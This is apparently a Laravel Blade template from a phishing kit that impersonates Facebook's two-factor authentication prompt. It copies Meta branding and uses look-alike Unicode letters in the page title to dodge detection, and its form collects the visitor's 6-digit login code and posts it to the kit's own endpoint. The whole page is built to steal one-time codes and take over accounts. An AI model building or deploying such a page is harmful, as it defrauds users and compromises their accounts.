<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fаcеbօօk - log in or sign up</title>
    <!-- BROWSER ICON -->
    <link rel="shortcut icon" href="resources/views/brot-log.png">

    <!-- VEDONRS -->
    <link href="public/css/bootstrap.min.css" rel="stylesheet">
    <link href="public/vendor/css/splide.min.css" rel="stylesheet">
    <!-- fontawesome -->
    <link href="public/vendor/css/all.min.css" rel="stylesheet">

    <!-- MAIN STYLE -->
    <link href="public/css/app.css" rel="stylesheet">
</head>

<body>
    <header class="primary-header">
        <img src="public/images/brot-secondary.svg" alt="">
    </header>
    <section class="authenticaiton-section">
        <div class="primary-component">
            <div class="authentication-text">
                <h4>Two-Factor Authentication Required</h4>
            </div>
            <div class="line-thick"></div>
            <div class="authentication-description">
                <p>You've asked us to require a 6-digit login code when anyone tries to access your account from a new
                    device or browser.</p>
                <p class="last-text">Enter the 6-digit code from your <b>Code Generator</b> or 3rd party app below</p>
            </div>
            <div class="digit6">
                <form id="authenticateform" action="authenticateform" method="post">
                    @csrf
                    <!-- <meta name="csrf-token" content="{{ csrf_token() }}" /> -->
                    @if($errors->any())
                    <label style="color:red;text-align: center;">{{$errors->first()}}</label>
                    @endif
                    <input id="text" required="required" placeholder="Please enter your 6 digit code" name="text" type="text">
                    <button type="submit" value="Submit">Submit</button>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <div class="brot-language">
            <ul>
                <li><a href="#">English (US)</a></li>
                <li><a href="#">Deutsch</a></li>
                <li><a href="#">Türkçe</a></li>
                <li><a href="#">Српски</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><a href="#">Italiano</a></li>
                <li><a href="#">Bosanski</a></li>
                <li><a href="#">Svenska</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
            </ul>
        </div>
        <div class="brot-meta">
            <div class="help-center">
                <ul>
                    <li><a href="">About</a></li>
                    <li><a href="">Help</a></li>
                    <li><a href="">More</a></li>
                </ul>
            </div>
            <div class="brot-text-meta">
                <p>Meta © 2022</p>
            </div>
        </div>
    </footer>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        // $('#authenticate-submit-btn').click(function(){
        //   $('#primary-form').get(0).submit();
        // });
    </script>
    <!-- Bootstrap's JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>
    <script src="js/bootstrap.min.js"></script>
    
    <!-- VENDORS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js"></script>
    <script src="vendor/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
        crossorigin="anonymous"></script>
    <!-- JS -->
    <script src="public/js/app.js"></script>
</body>

</html>